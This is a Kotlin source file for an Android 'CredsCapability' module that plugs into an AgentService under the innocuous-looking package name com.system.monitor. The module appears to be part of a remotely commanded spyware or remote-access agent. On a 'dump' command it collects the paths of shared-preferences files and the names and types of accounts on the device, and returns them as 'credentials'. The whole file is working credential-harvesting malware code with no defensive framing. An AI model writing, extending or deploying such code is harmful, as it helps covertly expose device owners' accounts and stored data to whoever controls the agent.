package com.system.monitor.capabilities

import android.content.Context
import android.content.SharedPreferences
import android.webkit.WebViewDatabase
import com.google.gson.Gson
import com.system.monitor.AgentService
import java.io.File

class CredsCapability(private val service: AgentService) : AgentService.Capability {

    private val gson = Gson()

    override fun execute(args: String?): Any {
        val params = gson.fromJson(args ?: "{}", Params::class.java)
        return when (params.action) {
            "dump" -> dumpCredentials()
            else -> mapOf<String, Any>("error" to "invalid action")
        }
    }

    override fun cleanup() {}

    private fun dumpCredentials(): Map<String, Any> {
        val creds = mutableListOf<Map<String, Any>>()
        
        // SharedPreferences
        val prefsDir = File(service.filesDir.parentFile, "shared_prefs")
        if (prefsDir.exists()) {
            prefsDir.listFiles()?.forEach { file ->
                if (file.extension == "xml") {
                    creds.add(mapOf<String, Any>("type" to "shared_prefs", "file" to file.name, "path" to file.absolutePath))
                }
            }
        }
        
        // Account manager - simplified
        try {
            val accounts = android.accounts.AccountManager.get(service).accounts
            val accountList = accounts.map { a -> mapOf<String, Any>("name" to a.name, "type" to a.type) }
            creds.add(mapOf<String, Any>("type" to "accounts", "accounts" to accountList))
        } catch (e: Exception) {
            // ignore
        }

        return mapOf<String, Any>("credentials" to creds, "count" to creds.size)
    }

    data class Params(val action: String)
}